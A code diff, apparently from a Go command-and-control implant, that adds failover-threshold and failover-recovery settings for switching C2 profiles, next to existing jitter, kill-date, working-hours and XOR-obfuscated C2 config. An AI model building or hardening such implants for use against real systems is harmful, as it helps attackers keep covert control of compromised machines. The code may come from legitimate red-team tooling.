@@ -19,17 +19,19 @@ import (
 
 // parsedConfig holds typed values derived from the build-time string globals.
 type parsedConfig struct {
-	callbackPort     int
-	sleepInterval    int
-	jitter           int
-	killDate         int64
-	maxRetries       int
-	httpTimeout      int
-	recoverySeconds  int // Seconds between recovery attempts for unhealthy C2 domains
-	debug            bool
-	whStartMinutes   int
-	whEndMinutes     int
-	whDays           []int
+	callbackPort        int
+	sleepInterval       int
+	jitter              int
+	killDate            int64
+	maxRetries          int
+	httpTimeout         int
+	recoverySeconds     int // Seconds between recovery attempts for unhealthy C2 domains
+	failoverThreshold   int // Consecutive failures before switching C2 profile
+	failoverRecovery    int // Seconds between primary recovery attempts when on backup
+	debug               bool
+	whStartMinutes      int
+	whEndMinutes        int
+	whDays              []int
 }
 
 // deobfuscateConfig XOR-decodes C2 config strings using the build-time key.
@@ -108,6 +110,14 @@ func parseConfigValues() parsedConfig {
 	cfg.recoverySeconds, err = strconv.Atoi(recoveryInterval)
 	if err != nil || cfg.recoverySeconds <= 0 {
 		cfg.recoverySeconds = 600 // 10 minutes default
+	}
+	cfg.failoverThreshold, err = strconv.Atoi(failoverThreshold)
+	if err != nil || cfg.failoverThreshold <= 0 {
+		cfg.failoverThreshold = 5
+	}
+	cfg.failoverRecovery, err = strconv.Atoi(failoverRecovery)
+	if err != nil || cfg.failoverRecovery <= 0 {
+		cfg.failoverRecovery = 300
 	}
 
 	// Parse working hours
